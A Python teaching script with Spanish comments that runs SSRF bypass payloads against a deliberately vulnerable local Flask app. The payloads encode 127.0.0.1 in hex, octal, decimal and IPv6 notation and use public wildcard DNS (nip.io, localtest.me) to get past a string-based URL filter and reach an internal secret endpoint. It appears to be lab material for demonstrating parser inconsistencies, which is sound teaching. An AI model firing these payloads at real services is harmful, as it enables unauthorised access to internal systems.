"""
attack_demo.py
--------------
Demuestra cómo el filtro basado en regex/string de vulnerable_app.py
puede ser evadido usando representaciones alternativas de 127.0.0.1.

Requisito: tener vulnerable_app.py corriendo en http://localhost:5000

Correr:
    python attack_demo.py
"""

import requests

TARGET = "http://localhost:5000/fetch"

# 127.0.0.1 expresado de formas que el regex no reconoce como "127.0.0.1".
#
# OJO: estos payloads dependen de que el RESOLVER DE RED del sistema
# interprete la notacion numerica alternativa (hex/octal/decimal) como IP.
# Eso lo hacen curl, los navegadores y a veces la libc de Linux, pero
# Python (socket.getaddrinfo) en WINDOWS es estricto y los trata como
# nombre de dominio -> da NameResolutionError, NO 403. Esa inconsistencia
# entre parsers es justamente el punto de la clase. Los marcados
# [fragil] pueden fallar por resolucion de DNS en vez de por el filtro.
PAYLOADS = {
    "Control: IP literal (deberia bloquearse)":  "http://127.0.0.1:5000/internal/secret",
    "[fragil] Hexadecimal":                       "http://0x7f000001:5000/internal/secret",
    "[fragil] Octal":                             "http://0177.0.0.1:5000/internal/secret",
    "[fragil] Decimal (entero de 32 bits)":       "http://2130706433:5000/internal/secret",
    "[fragil] IPv6 en hex puro (sin '127.0.0.1')": "http://[::ffff:7f00:1]:5000/internal/secret",
    "IPv6 loopback":                              "http://[::1]:5000/internal/secret",
    "Punto final (fully qualified)":              "http://127.0.0.1.:5000/internal/secret",

    # --- Bypass SIN tocar nada en tu maquina: usa DNS PUBLICO real ---
    # nip.io y localtest.me son servicios de DNS wildcard publicos que
    # resuelven a 127.0.0.1. Como la resolucion es DNS de verdad (no
    # notacion numerica), funcionan igual en Windows, Mac y Linux.
    # Requieren que la maquina que corre este script tenga internet
    # (el fetch real al puerto 5000 sigue siendo local).
    "DNS publico con guiones (nip.io)":           "http://127-0-0-1.nip.io:5000/internal/secret",
    "DNS publico directo (localtest.me)":         "http://localtest.me:5000/internal/secret",
}

def main():
    print(f"Atacando {TARGET}\n" + "-" * 60)
    for name, payload in PAYLOADS.items():
        try:
            r = requests.get(TARGET, params={"url": payload}, timeout=5)
            bypass = r.status_code == 200
            marca = "BYPASS ✅" if bypass else "bloqueado"
            print(f"[{marca}] {name}")
            print(f"    url:  {payload}")
            print(f"    resp: {r.status_code} {r.text[:120]}\n")
        except Exception as e:
            print(f"[error] {name}: {e}\n")

if __name__ == "__main__":
    main()
